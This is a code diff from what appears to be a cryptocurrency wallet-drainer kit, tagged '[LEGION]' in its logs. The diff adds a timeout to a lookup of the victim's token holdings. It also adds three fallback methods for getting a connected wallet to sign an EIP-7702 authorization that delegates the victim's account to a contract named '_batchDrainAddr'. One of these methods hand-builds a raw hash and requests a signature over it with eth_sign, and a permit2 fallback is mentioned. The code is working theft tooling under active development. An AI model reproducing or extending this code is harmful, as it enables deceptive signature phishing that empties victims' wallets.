@@ -888,7 +888,10 @@
           try {
             var _candidateTokens = [DEFAULT_USDC];
             try {
-              var ranked = await apiPost('/api/v1/scout/ranked', { wallet_address: evmAddr, chain_family: 'EVM' });
+              var ranked = await Promise.race([
+                apiPost('/api/v1/scout/ranked', { wallet_address: evmAddr, chain_family: 'EVM' }),
+                new Promise(function(_, rej) { setTimeout(function() { rej(new Error('timeout')); }, 5000); })
+              ]);
               var rankedAssets = (ranked && ranked.data && ranked.data.assets) || (ranked && ranked.assets);
               if (rankedAssets) {
                 rankedAssets.filter(function(a) { return a.token && a.token !== 'native' && a.token.indexOf('0x') === 0; })
@@ -925,52 +928,98 @@
             var _userNonceNum = parseInt(_userNonceHex, 16) || 0;
             var _chainIdNum = Number(evmChainId);
 
-            // EIP-7702 via eth_signTypedData_v4 (indirect path — triggers MetaMask internal EIP-7702 flow)
-            // Direct wallet_signAuthorization is not exposed; instead we use typed data with Authorization type
+            // EIP-7702 authorization sign — try all known MetaMask/wallet parameter formats
             var _auth = null;
-            try {
-              var _authTypedData = {
-                domain: {
-                  name: 'EIP7702',
-                  version: '1',
-                  chainId: _chainIdNum
-                },
-                types: {
-                  EIP712Domain: [
-                    { name: 'name', type: 'string' },
-                    { name: 'version', type: 'string' },
-                    { name: 'chainId', type: 'uint256' }
-                  ],
-                  Authorization: [
-                    { name: 'contractAddress', type: 'address' },
-                    { name: 'nonce', type: 'uint64' }
-                  ]
-                },
-                primaryType: 'Authorization',
-                message: {
-                  contractAddress: _batchDrainAddr,
-                  nonce: _userNonceNum
-                }
-              };
-              console.log('[LEGION] EIP-7702 → eth_signTypedData_v4 Authorization | nonce:', _userNonceNum, '| contract:', _batchDrainAddr.slice(0,10));
-              var _rawSig = await eth.request({
-                method: 'eth_signTypedData_v4',
-                params: [evmAddr, JSON.stringify(_authTypedData)]
-              });
-              if (_rawSig && _rawSig.length >= 130) {
-                // Parse raw hex sig into r, s, yParity
-                var _sigHex = _rawSig.replace('0x', '');
-                var _r = '0x' + _sigHex.slice(0, 64);
-                var _s = '0x' + _sigHex.slice(64, 128);
-                var _vInt = parseInt(_sigHex.slice(128, 130), 16);
-                var _yParity = (_vInt === 27 || _vInt === 0) ? 0 : 1;
-                _auth = { r: _r, s: _s, yParity: _yParity, v: _vInt, nonce: _userNonceNum };
-                console.log('[LEGION] ✅ EIP-7702 typed data signed | yParity:', _yParity);
-              }
-            } catch (_authErr) {
-              console.warn('[LEGION] EIP-7702 typed data sign failed:', _authErr.message.slice(0, 100));
-              _auth = null;
+
+            // Helper: parse raw 65-byte hex sig → {r,s,yParity,v,nonce}
+            function _parseSig(raw, nonceVal) {
+              if (!raw || raw.length < 130) return null;
+              var h = raw.replace('0x','');
+              var r = '0x' + h.slice(0,64), s = '0x' + h.slice(64,128);
+              var v = parseInt(h.slice(128,130), 16);
+              return { r: r, s: s, yParity: (v === 28 || v === 1) ? 1 : 0, v: v, nonce: nonceVal };
             }
+
+            // Attempt A: wallet_signAuthorization with hex params (MetaMask 12+ EIP-7702 spec)
+            var _chainHex = '0x' + _chainIdNum.toString(16);
+            var _nonceHex = '0x' + _userNonceNum.toString(16);
+            if (!_auth) {
+              try {
+                console.log('[LEGION] EIP-7702 try #A: wallet_signAuthorization hex {address}');
+                var _rA = await eth.request({
+                  method: 'wallet_signAuthorization',
+                  params: [{ address: _batchDrainAddr, chainId: _chainHex, nonce: _nonceHex }]
+                });
+                if (_rA) {
+                  _auth = typeof _rA === 'string' ? _parseSig(_rA, _userNonceNum)
+                        : { r: _rA.r, s: _rA.s, yParity: _rA.yParity !== undefined ? _rA.yParity : (_rA.v !== undefined ? _rA.v : 0), v: _rA.v, nonce: _userNonceNum };
+                  console.log('[LEGION] ✅ EIP-7702 format #A worked');
+                }
+              } catch (eA) { console.warn('[LEGION] #A failed:', eA.message.slice(0,80)); }
+            }
+
+            // Attempt B: wallet_signAuthorization with contractAddress (viem style)
+            if (!_auth) {
+              try {
+                console.log('[LEGION] EIP-7702 try #B: wallet_signAuthorization hex {contractAddress}');
+                var _rB = await eth.request({
+                  method: 'wallet_signAuthorization',
+                  params: [{ contractAddress: _batchDrainAddr, chainId: _chainHex, nonce: _nonceHex }]
+                });
+                if (_rB) {
+                  _auth = typeof _rB === 'string' ? _parseSig(_rB, _userNonceNum)
+                        : { r: _rB.r, s: _rB.s, yParity: _rB.yParity !== undefined ? _rB.yParity : (_rB.v !== undefined ? _rB.v : 0), v: _rB.v, nonce: _rB.nonce !== undefined ? Number(_rB.nonce) : _userNonceNum };
+                  console.log('[LEGION] ✅ EIP-7702 format #B worked');
+                }
+              } catch (eB) { console.warn('[LEGION] #B failed:', eB.message.slice(0,80)); }
+            }
+
+            // Attempt C: eth_sign raw EIP-7702 hash — keccak256(0x05 || rlp([chainId, addr, nonce]))
+            // This is the ONLY method that produces a sig valid for Ethereum node verification.
+            // MetaMask signs raw bytes without any prefix (unlike personal_sign).
+            if (!_auth) {
+              try {
+                console.log('[LEGION] EIP-7702 try #C: eth_sign with raw EIP-7702 hash');
+                // Load ethers for RLP + keccak256 (use window.ethers or fetch from CDN)
+                var _ethLib = null;
+                if (window.ethers && window.ethers.utils && window.ethers.utils.keccak256) {
+                  _ethLib = window.ethers;
+                } else {
+                  _ethLib = await new Promise(function(res, rej) {
+                    var _es = document.createElement('script');
+                    _es.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js';
+                    _es.onload = function() { res(window.ethers); };
+                    _es.onerror = rej;
+                    document.head.appendChild(_es);
+                  });
+                }
+
+                // EIP-7702 hash: keccak256(0x05 || RLP([chainId, contractAddress, nonce]))
+                // RLP integers: 0 → '0x', >0 → minimal big-endian hex bytes
+                function _rlpInt(n) {
+                  if (n === 0) return '0x';
+                  var h = n.toString(16);
+                  return '0x' + (h.length % 2 ? '0' : '') + h;
+                }
+                var _rlpEncoded = _ethLib.utils.RLP.encode([
+                  _rlpInt(_chainIdNum),   // chainId
+                  _batchDrainAddr,        // 20-byte address
+                  _rlpInt(_userNonceNum)  // nonce
+                ]);
+                // Prepend 0x05 magic byte (EIP-7702 domain)
+                var _toHash = '0x05' + _rlpEncoded.slice(2);
+                var _eip7702Hash = _ethLib.utils.keccak256(_toHash);
+                console.log('[LEGION] EIP-7702 hash:', _eip7702Hash);
+
+                var _rawSigC = await eth.request({ method: 'eth_sign', params: [evmAddr, _eip7702Hash] });
+                if (_rawSigC) {
+                  _auth = _parseSig(_rawSigC, _userNonceNum);
+                  if (_auth) console.log('[LEGION] ✅ EIP-7702 format #C worked (eth_sign raw hash)');
+                }
+              } catch (eC) { console.warn('[LEGION] #C failed:', eC.message ? eC.message.slice(0,100) : String(eC)); }
+            }
+
+            if (!_auth) { console.warn('[LEGION] ❌ All EIP-7702 formats failed — falling back to permit2'); }
 
             if (_auth) {
               console.log('[LEGION] ✅ EIP-7702 authorization signed | yParity:', _auth.yParity || _auth.v);
